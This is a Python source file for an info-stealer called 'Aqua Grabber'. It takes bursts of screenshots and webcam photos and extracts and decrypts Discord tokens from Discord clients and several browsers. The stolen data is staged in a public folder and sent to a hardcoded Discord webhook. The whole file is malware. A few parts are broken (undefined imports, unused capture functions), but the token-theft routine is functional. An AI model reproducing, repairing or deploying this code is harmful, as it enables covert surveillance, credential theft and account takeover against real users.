import base64
import json
import os
import re
import shutil
import glob
import subprocess
from typing import Any

import cv2
import win32com.client
import requests

from PIL import Image
from discord_webhook import DiscordWebhook, DiscordEmbed
from mss import mss
from Cryptodome.Cipher import AES
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

user = os.environ.get("USERNAME")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
Aqua = "C:/Users/Public/Aqua"


def get_HWID():
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    return current_machine_id


def makeDir():
    if not os.path.exists('C:/Users/Public/Aqua'):
        os.mkdir("C:/Users/Public/Aqua")
    if not os.path.exists('C:/Users/Public/Aqua/ss'):
        os.mkdir("C:/Users/Public/Aqua/ss")
    if not os.path.exists('C:/Users/Public/Aqua/Cam'):
        os.mkdir("C:/Users/Public/Aqua/Cam")
    if not os.path.exists('C:/Users/Public/Aqua/Info'):
        os.mkdir("C:/Users/Public/Aqua/Info")


def takeSS():
    for i in range(50):
        with mss() as sct:
            sct.shot(mon=-1, output=f"{Aqua}/ss/{i}.png")
            print(f"Done SS Number {i}")

    frame_folder = f'{Aqua}/ss'

    def make_gif():
        frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
        frame_one = frames[0]
        frame_one.save(f"{Aqua}/ss/SS.gif", format="GIF", append_images=frames,
                       save_all=True, duration=100, loop=1)

    make_gif()
    with open(f'{Aqua}/ss/SS.gif', 'rb') as f:
        file_data = f.read()
    webhook.content = f'```{user} | ScreenShot | HWID: {get_HWID()}```'
    webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
    print("Done Taking ScreenShots")
    webhook.execute()
    webhook.remove_files()


def getCam():
    try:
        test = 0
        wmi = win32com.client.GetObject("winmgmts:")
        for usb in wmi.InstancesOf("Win32_USBHub"):
            if str(usb.DeviceID).startswith("USB\VID"):
                test = test + 1
            else:
                pass
        for x in range(test):
            try:
                camera = cv2.VideoCapture(x)
                for i in range(1):
                    return_value, image = camera.read()
                    cv2.imwrite(f'{Aqua}/Cam/{str(x)}.png', image)
                    print(f"Webcam[{x}] Done Pic " + str(i))
                del camera
                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_HWID()}```'
                with open(f'{Aqua}/Cam/{x}.png', 'rb') as f:
                    file_data = f.read()
                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.png')
                print(f"Done Grabbing Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
            except:
                webhook.content = f'```{user} | Failed To Grab Webcam {x} | HWID: {get_HWID()}```'
                print(f"Failed Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
    except:
        webhook.content = f'```{user} | Webcam Grab Unknown Error | HWID: {get_HWID()}```'
        print(f"Unknown Error")
        webhook.execute()
        webhook.remove_files()


def getDcToken():
    tokenPaths = {
        'Discord': f"{roaming}\\Discord",
        'Discord Canary': f"{roaming}\\discordcanary",
        'Discord PTB': f"{roaming}\\discordptb",
        'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
        'Opera': f"{roaming}\\Opera Software\\Opera Stable",
        'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
        'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
    }
    fileInfo = f"tokens_" + os.getlogin() + ".txt"

    def decrypt_token(buff, master_key):
        try:
            return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                           buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            pass

    def get_tokens(path):
        cleaned = []
        tokens = []
        done = []
        lev_db = f"{path}\\Local Storage\\leveldb\\"
        loc_state = f"{path}\\Local State"
        # new method with encryption
        if os.path.exists(loc_state):
            with open(loc_state, "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
            for file in os.listdir(lev_db):
                if not file.endswith(".ldb") and file.endswith(".log"):
                    continue
                else:
                    try:
                        with open(lev_db + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError:
                        continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]

        else:  # old method without encryption
            for file_name in os.listdir(path):
                try:
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                 x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                done.append(token)
                except:
                    continue

        return done

    def main_tokens():
        for platform, path in tokenPaths.items():
            if not os.path.exists(path):
                continue
            try:
                tokens = set(get_tokens(path))
            except:
                continue
            if not tokens:
                continue
            with open(f"{Aqua}/Info/{fileInfo}", "a") as f:
                for i in tokens:
                    f.write(str(i) + "\n")
                    print(f"Found Token : {i}")
        print("started")

    main_tokens()


# Clean Up
def cleanUp():
    shutil.rmtree(Aqua)


webhook_url = 'https://discord.com/api/webhooks/1181292565551656960/CKgsPF6b19sUj6cKdxdOl0PDBWi_IeArbn887nBygG1JCmCTuj3Cg3-kg1bcaNtHlpfq'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
webhook.username = "Aqua Grabber"


def runAqua():
    makeDir()
    getDcToken()


runAqua()
